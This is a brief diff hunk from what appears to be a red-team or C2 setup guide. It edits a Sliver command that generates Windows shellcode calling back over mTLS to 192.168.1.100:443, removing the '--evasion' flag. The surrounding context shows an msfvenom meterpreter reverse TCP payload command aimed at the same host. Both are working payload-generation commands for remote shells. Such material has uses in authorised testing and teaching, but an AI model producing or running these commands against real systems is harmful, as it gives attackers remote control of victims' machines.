@@ -265,7 +265,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 E
 **Sliver:**
 ```bash
 # In Sliver console
-generate --mtls 192.168.1.100:443 --format shellcode --os windows --evasion
+generate --mtls 192.168.1.100:443 --format shellcode --os windows
 # Then copy the generated .bin file to the shared/ folder
 ```
 
